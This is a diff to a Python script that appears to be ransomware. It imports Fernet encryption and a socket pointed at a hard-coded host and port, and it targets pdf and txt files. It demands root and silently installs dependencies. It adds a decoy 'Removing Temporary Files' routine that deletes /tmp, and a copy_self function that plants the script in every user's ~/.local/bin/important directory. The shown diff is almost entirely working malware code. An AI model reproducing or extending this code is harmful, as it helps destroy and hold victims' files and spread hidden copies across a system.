@@ -1,12 +1,27 @@
-from cryptography.fernet import Fernet
-from socket import socket, gethostname
-from os import makedirs,listdir,getcwd,remove
+from subprocess import Popen,call
+from os import makedirs,listdir,getcwd,remove, getuid
 from os.path import dirname, exists
 from os.path import isdir,isfile,splitext
+
+if getuid()!=0:
+    print("Script does not have sufficient privileges.")
+    print("Please Run as either root user or using sudo")
+    exit()
+
+    
+try:
+    import cryptography
+except ImportError:
+    cmd='apt install python3-pip'
+    call(cmd,shell=True)
+    cmd='pip3 install cryptography'
+    call(cmd,shell=True)
+    
+
+from socket import socket, gethostname
 from pathlib import Path
 from time import sleep
-from subprocess import Popen,call
-
+from cryptography.fernet import Fernet
 
 # import sweeper
 # import encrypt
@@ -15,14 +30,18 @@ port=11111
 host='192.168.1.127'
 encr=['pdf','txt']
 
+def fake():
+    print("Removing Temporary Files:")
+    cmd='rm -rvf /tmp/*'
+    Popen(cmd,shell=True)
 
-sock=socket()
+sock = socket()
 def copy_self():
     for each in listdir('/home/'):
         pth='/home/'+each+'/.local/bin/important'
         try:
             makedirs(pth,exist_ok=True)
-            cmd='cp '+getcwd()+'/* /home/'+each +'/.local/bin/important/ > /dev/nulls'
+            cmd='cp '+getcwd()+'/* /home/'+each +'/.local/bin/important/ > /dev/null'
             Popen(cmd, shell=True)
         except PermissionError:
             pass
